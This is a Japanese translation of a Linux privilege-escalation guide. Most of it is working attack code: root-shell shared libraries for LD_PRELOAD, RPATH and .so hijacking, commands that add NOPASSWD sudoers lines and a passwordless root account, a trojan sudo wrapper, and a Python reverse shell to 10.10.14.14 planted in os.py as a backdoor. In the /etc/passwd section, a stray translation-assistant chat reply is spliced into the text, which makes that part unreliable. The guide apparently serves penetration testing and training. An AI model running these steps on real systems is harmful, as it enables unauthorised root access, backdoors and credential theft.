Sudo の設定によって、ユーザーがパスワードを知らなくても別のユーザーの権限でコマンドを実行できる場合がある。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例ではユーザー `demo` が `root` として `vim` を実行できるため、`ssh` キーを root ディレクトリに追加するか `sh` を呼び出すことで簡単にシェルを取得できます。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、実行時にユーザーが **環境変数を設定する** ことを許可します：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTB machine Admirer に基づく**もので、スクリプトをrootとして実行する際に任意の python ライブラリを読み込ませるための**PYTHONPATH hijacking**に**脆弱**でした:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo 実行時のパス回避

**Jump** して他のファイルを読んだり、**symlinks** を使ったりします。例えば sudoers file では: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし**wildcard**が使われている（\*）場合は、さらに簡単です：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudoコマンド/SUIDバイナリ（コマンドのパスが指定されていない場合）

もし **sudo権限** が単一のコマンド **パスが指定されていない** 状態で付与されている場合: _hacker10 ALL= (root) less_ PATH環境変数を変更することで悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この手法は **suid** バイナリ **パスを指定せずに別のコマンドを実行する場合（常に _**strings**_ で奇妙な SUID バイナリの内容を確認してください）** にも使用できます。

[Payload examples to execute.](payloads-to-execute.md)

### SUID バイナリとコマンドのパス

もし **suid** バイナリが**パスを指定して別のコマンドを実行する**場合、suid ファイルが呼び出しているコマンド名で **export a function** を試すことができます。

例えば、suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出す場合、同名の関数を作成してそれを export してみます:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, when you call the suid binary, this function will be executed

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 環境変数は、標準の C ライブラリ（`libc.so`）を含む他のすべてのライブラリよりも先にローダによって読み込まれる、1つ以上の共有ライブラリ（.so ファイル）を指定するために使用されます。このプロセスはライブラリのプリロードとして知られています。

しかし、この機能が特に **suid/sgid** 実行ファイルで悪用されるのを防ぎ、システムのセキュリティを維持するために、システムはいくつかの条件を強制します：

- 実行ファイルの real user ID（_ruid_）が effective user ID（_euid_）と一致しない場合、ローダは **LD_PRELOAD** を無視します。
- suid/sgid を持つ実行ファイルに対しては、同じく suid/sgid である標準パス内のライブラリのみがプリロードされます。

`sudo` でコマンドを実行する権限があり、`sudo -l` の出力に **env_keep+=LD_PRELOAD** という記述が含まれている場合、Privilege escalation が発生する可能性があります。この設定により、`sudo` でコマンドを実行しても **LD_PRELOAD** 環境変数が保持され認識されるため、結果として特権昇格した状態で任意のコードが実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
ファイルを **/tmp/pe.c** として保存
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に **compile it** を使用して:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行します
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 攻撃者が **LD_LIBRARY_PATH** env variable を制御している場合、同様の privesc を悪用できる。ライブラリが検索されるパスを攻撃者が制御するためだ。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

通常とは異なる**SUID**権限を持つバイナリを見つけた場合、**.so**ファイルを正しくロードしているか確認することが推奨されます。これは次のコマンドを実行して確認できます：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーが発生した場合、悪用の可能性が考えられます。

これを悪用するには、_"/path/to/.config/libcalc.c"_ というCファイルを作成し、次のコードを含めます：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイルのパーミッションを操作し、権限昇格したシェルを実行することで特権を昇格させることを目的としています。

上記のCファイルを共有オブジェクト（.so）ファイルにコンパイルするには：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受けた SUID binary を実行すると exploit が発動し、system compromise を招く可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
書き込み可能なフォルダからライブラリをロードするSUID binaryを見つけたので、そのフォルダに必要な名前でライブラリを作成しましょう:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
これは、生成したライブラリが `a_function_name` という関数を持っている必要があることを意味します。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) はローカルのセキュリティ制限を回避するために悪用できる Unix バイナリのキュレーションリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は、コマンドに **引数だけを注入できる** 場合の同様のリストです。

このプロジェクトは、Unix バイナリの正規の機能を収集しており、それらを悪用して restricted shells から脱出したり、権限を昇格・維持したり、ファイルを転送したり、bind and reverse shells を生成したり、その他の post-exploitation タスクを容易にします。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

権限昇格の要件:

- 既にユーザー "_sampleuser_" として shell を持っていること
- "_sampleuser_" が直近 **15分以内** に何かを `sudo` で実行していること（デフォルトではそれが sudo token の有効期間で、パスワードなしで `sudo` を使える時間です）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0 であること
- `gdb` にアクセスできること（アップロード可能であること）

（一時的に ptrace_scope を有効化するには `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を実行するか、/etc/sysctl.d/10-ptrace.conf を恒久的に変更して `kernel.yama.ptrace_scope = 0` に設定します）

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- 2番目の exploit (`exploit_v2.sh`) は _/tmp_ に root 所有で setuid が付与された sh shell を作成します
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- この **3番目の exploit** (`exploit_v3.sh`) は **sudoers ファイルを作成し**、**sudo tokens を永続化し、すべてのユーザーが sudo を使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダ、またはそのフォルダ内に作成されたファイルのいずれかに**write permissions**がある場合、バイナリ[**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)を使って、ユーザーとPIDのための**sudo token**を作成できます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、そのユーザー（PID 1234）としてシェルを持っている場合、パスワードを知らなくても次のようにして**obtain sudo privileges**できます:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` および `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使えるか、またその方法を設定します。これらのファイルは**デフォルトではユーザー root とグループ root のみが読み取ることができます**。\
**もし** このファイルを**読み取る**ことができれば、**興味深い情報を取得できる可能性があります**。また、任意のファイルに**書き込む**ことができれば、**escalate privileges** できます。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込みが可能であれば、この権限を悪用できます。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` バイナリの代替として、OpenBSD 向けの `doas` などがあります。設定は `/etc/doas.conf` を確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

特定の user が通常マシンに接続して `sudo` を使って権限昇格することが分かっており、その user コンテキストで shell を得ている場合、まずあなたのコードを root として実行し、その後 user のコマンドを実行するような新しい sudo executable を作成できます。次に user コンテキストの $PATH（例えば新しいパスを .bash_profile に追加）を変更すれば、user が sudo を実行したときにあなたの sudo executable が実行されます。

注意: user が別の shell（bash 以外）を使用している場合、新しいパスを追加するために他のファイルを修正する必要があります。例えば[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` を修正します。別の例は [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にあります。

あるいは次のようなコマンドを実行する:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は **読み込まれる設定ファイルの場所** を示します。通常、このファイルには次のパスが含まれます: `include /etc/ld.so.conf.d/*.conf`

つまり `/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれます。これらの設定ファイルは **他のフォルダを指し示し**、そこでは **ライブラリ** が **検索** されます。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` である場合、**これはシステムが `/usr/local/lib` 内でライブラリを検索することを意味します**。

もし何らかの理由で **ユーザーが書き込み権限を持っている** 場合、次のいずれかのパス：`/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内の設定ファイルが指す任意のフォルダに対して書き込み権限があると、権限昇格できる可能性があります.\
次のページでこの誤設定を**どのように悪用するか**を確認してください：

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数で指定されたこの場所でプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、以下のコマンドで `/var/tmp` に悪意のあるライブラリを作成します: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities はプロセスに対して利用可能な **root privileges のサブセット** を提供します。これにより root の **privileges がより小さく特徴的な単位に分割** されます。これらの各単位は個別にプロセスへ付与できます。こうして特権の全体集合が縮小され、exploitation のリスクが低減します。\
以下のページを読んで、**capabilities とそれを悪用する方法** についてさらに学んでください:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリにおいて、**"execute" ビット** は対象ユーザーが "**cd**" でフォルダに入れることを意味します。\
**"read"** ビットはユーザーが **list** で **files** を確認できることを意味し、**"write"** ビットはユーザーが **delete** および **create** によって新しい **files** を作成・削除できることを意味します。

## ACLs

Access Control Lists (ACLs) は裁量的な権限の二次層を表し、**traditional ugo/rwx permissions を上書きできる** 機能を持ちます。これらの権限は、所有者でもグループの一員でもない特定のユーザーに対して許可や拒否を与えることで、ファイルやディレクトリへのアクセス制御を強化します。このレベルの **granularity はより正確なアクセス管理を可能にします**。Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**付与する** user "kali" にファイルの read と write 権限を:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得する** システムから特定のACLが設定されたファイル:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## shell sessions を開く

**古いバージョン**では、別のユーザー（**root**）のいくつかの **shell** セッションを **hijack** できる場合があります。\
**最新バージョン**では、**connect** できるのは **自身のユーザー** の **screen sessions** のみです。とはいえ、**セッション内の興味深い情報** を見つけることがあります。

### screen sessions hijacking

**screen sessions を一覧表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは **古い tmux バージョン** の問題でした。非特権ユーザーとして、root によって作成された tmux (v2.1) セッションをハイジャックできませんでした。

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションにアタッチ**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
このバグは当該OSで新しい ssh key を作成した際に発生し、**可能なバリエーションが32,768通りしかなかった**ために起こります。つまり全ての可能性を計算でき、**ssh public key を持っていれば対応する private key を検索できる**ということです。計算済みの可能性はこちらで確認できます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** パスワード認証が許可されているかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** public key 認証が許可されているかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合に、空のパスワード文字列を持つアカウントでのログインを許可するかどうかを指定します。デフォルトは `no` です。

### PermitRootLogin

root が ssh でログインできるかどうかを指定します。デフォルトは `no` です。可能な値:

- `yes`: root はパスワードおよび private key でログインできます
- `without-password` or `prohibit-password`: root は private key のみでログインできます
- `forced-commands-only`: root は private key でのみ、かつコマンドオプションが指定されている場合にのみログインできます
- `no` : ログイン不可

### AuthorizedKeysFile

ユーザ認証に使用できる public keys を含むファイルを指定します。`%h` のようなトークンを含めることができ、これはホームディレクトリに置き換えられます。**絶対パスを指定することができます**（`/` で始まる）または**ユーザのホームからの相対パスを指定することができます**。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー「**testusername**」の**private**キーでログインしようとすると、ssh があなたのキーの公開鍵を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にある鍵と比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding により、サーバー上に（パスフレーズなしで）鍵を置いたままにするのではなく、**ローカルの SSH キーを使用する**ことができます。つまり、ssh を使って **ホストに接続** し、そこから **最初のホストにある鍵を使用して** 別のホストへ **接続** することが可能になります。

このオプションは `$HOME/.ssh.config` に次のように設定する必要があります:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

ファイル `/etc/ssh_config` はこのオプションを **上書き** してこの構成を許可または拒否することができます。\
ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` によって ssh-agent forwarding を **許可** または **拒否** できます（デフォルトは allow）。

環境で Forward Agent が設定されているのを見つけたら、次のページを必ず読んでください — **悪用して権限を昇格できる可能性があります**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

ファイル `/etc/profile` と `/etc/profile.d/` 以下のファイルは、**ユーザーが新しいシェルを起動したときに実行されるスクリプトです**。したがって、それらのいずれかに **書き込みや修正ができれば、権限を昇格できる**。
```bash
ls -l /etc/profile /etc/profile.d/
```
不審なプロファイルスクリプトが見つかった場合は、**機密情報**が含まれていないか確認してください。

### Passwd/Shadow ファイル

OSによっては `/etc/passwd` と `/etc/shadow` ファイルが別名になっていたり、バックアップが存在する場合があります。したがって、**それらをすべて見つけ**、**読み取れるかチェック**して、ファイル内に**ハッシュがあるか**確認することをおすすめします：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等の）ファイルの中に**password hashes**が含まれていることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能 /etc/passwd

まず、以下のいずれかのコマンドでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
その README.md の内容（src/linux-hardening/privilege-escalation/README.md の全テキスト）を貼ってください。翻訳して返します。

補足確認：
- 「Then add the user `hacker` and add the generated password.」を翻訳文に追加してよいですか？（追加する場合、パスワードをこちらで生成して本文に含めますか、それとも既にある生成済みパスワードを提供しますか）
- 注意：実際のシステム上でユーザーを作成することはできません。必要であれば、ユーザー追加用のコマンド例（useradd, passwd など）と生成したパスワードは翻訳内に記載できます。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドで `hacker:hacker` を使えます。

あるいは、以下の行を使ってパスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSD プラットフォームでは `/etc/passwd` は `/etc/pwd.db` と `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

いくつかの機密ファイルに**書き込みできるか**を確認してください。例えば、いくつかの**サービスの設定ファイル**に書き込めますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが **tomcat** サーバーを実行していて、**/etc/systemd/ 内の Tomcat サービス設定ファイルを変更できる,** 場合は、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
あなたの backdoor は次回 tomcat が起動すると実行されます。

### フォルダの確認

以下のフォルダにはバックアップや興味深い情報が含まれている可能性があります： **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (おそらく最後のものは読めないでしょうが、試してみてください)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近に変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内の Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **ウェブファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを確認してください。**パスワードを含む可能性のある複数のファイル**を検索します。\
**もう一つの興味深いツール**として使えるのが: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) で、Windows、Linux、Mac のローカルコンピュータに保存された多数のパスワードを取得するためのオープンソースアプリケーションです。

### ログ

ログを読むことができれば、**その中から興味深い／機密情報を見つけられる可能性があります**。ログが奇妙であればあるほど、（おそらく）より興味深いでしょう。\
また、設定が「**不適切**」（バックドアが仕込まれている？）な**監査ログ**は、監査ログ内に**パスワードを記録**させることを許す場合があり、この投稿で説明されています: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/].
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**ログを読むためのグループ** [**adm**](interesting-groups-linux-pe/index.html#adm-group) は非常に役立ちます。

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイル名や内容に **password** を含むファイル、ログ内の IPs や emails、ハッシュの regexps も確認してください。  
ここでこれらすべての方法を列挙するつもりはありませんが、興味があれば [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が行う最後のチェックを確認できます。

## 書き込み可能なファイル

### Python library hijacking

もし python スクリプトがどの **where** から実行されるか分かっていて、そのフォルダに **can write inside** か、**modify python libraries** できるなら、OS ライブラリを改変して backdoor することができます（python スクリプトが実行される場所に書き込みできる場合は、os.py ライブラリをコピーして貼り付けてください）。

ライブラリを **backdoor the library** するには、os.py ライブラリの末尾に以下の行を追加してください（IP と PORT を変更してください）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate の悪用

`logrotate` の脆弱性により、ログファイルやその親ディレクトリに対して **書き込み権限** を持つユーザーが特権を昇格できる可能性があります。これは、`logrotate` が多くの場合 **root** として動作しており、特に _**/etc/bash_completion.d/**_ のようなディレクトリで任意のファイルを実行するように操作され得るためです。検査は _/var/log_ に限らず、ログローテーションが適用されるあらゆるディレクトリでパーミッションを確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` のバージョン `3.18.0` 以下に影響します

詳細は次のページを参照してください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) を使って悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** に非常に類似しています。したがって、ログを改変できることが分かった場合は、それらのログを誰が管理しているかを確認し、ログを symlinks に置き換えることで特権昇格できないか確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由でユーザーが _/etc/sysconfig/network-scripts_ に `ifcf-<whatever>` スクリプトを **書き込める**、または既存のスクリプトを **修正できる** 場合、あなたの **system is pwned**。

Network scripts（例: _ifcg-eth0_）はネットワーク接続に使われます。見た目は .INI ファイルとまったく同じです。しかし、Linuxでは Network Manager (dispatcher.d) によって ~sourced~ されます。

私の場合、これらの network scripts 内の `NAME=` の値が正しく処理されていません。名前に **空白がある場合、システムは空白以降の部分を実行しようとします**。つまり、**最初の空白以降のすべてが root として実行されます**。

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network と /bin/id の間の空白に注意_)

### **init、init.d、systemd、および rc.d**

`/etc/init.d` ディレクトリは System V init (SysVinit) 用の **scripts** の格納場所です。これはクラシックな Linux サービス管理システムで、`start`、`stop`、`restart`、場合によっては `reload` といったサービス操作を行うスクリプトを含みます。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` が使われます。

一方で、`/etc/init` は **Upstart** に関連しており、Ubuntu が導入した新しい **service management** で、サービス管理のための設定ファイルを使用します。Upstart への移行にもかかわらず、互換レイヤーのため SysVinit スクリプトは Upstart 設定と併用されることがよくあります。

